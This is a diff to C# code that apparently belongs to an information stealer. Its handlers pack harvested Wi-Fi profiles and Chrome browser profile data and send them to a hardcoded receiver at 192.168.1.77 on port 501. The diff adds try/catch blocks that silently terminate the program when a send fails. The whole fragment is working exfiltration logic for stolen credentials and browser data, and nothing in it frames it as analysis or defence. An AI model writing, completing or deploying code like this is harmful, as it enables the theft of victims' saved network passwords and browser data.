@@ -8,20 +8,40 @@ namespace PS03
 {
     public class Eventhandlers
     {
-        public RTransLink rtl = new RTransLink();
+        public RTransLink rtl = new RTransLink("192.168.1.77",501);
         private ChromePacker cpack = new ChromePacker();
         private WifiPacker wpack = new WifiPacker();
 
         public void HandleWiFiProfileReady(List<Profile> profiles)
         {
             foreach (var profile in profiles)
-                rtl.Send(wpack.Pack(profile));
+            {
+                try
+                {
+                    rtl.Send(wpack.Pack(profile));
+                }
+                catch(Exception)
+                {
+                    Environment.Exit(0);
+                }
+            }
+                
         }
 
         public void HandleChromeDataReady(List<CPProfile> profiles)
         {
             foreach (var profile in profiles)
-                rtl.Send(cpack.Pack(profile));
+            {
+                try
+                {
+                    rtl.Send(cpack.Pack(profile));
+                }
+                catch (Exception)
+                {
+                    Environment.Exit(0);
+                }
+            }
+
         }
     }
 }
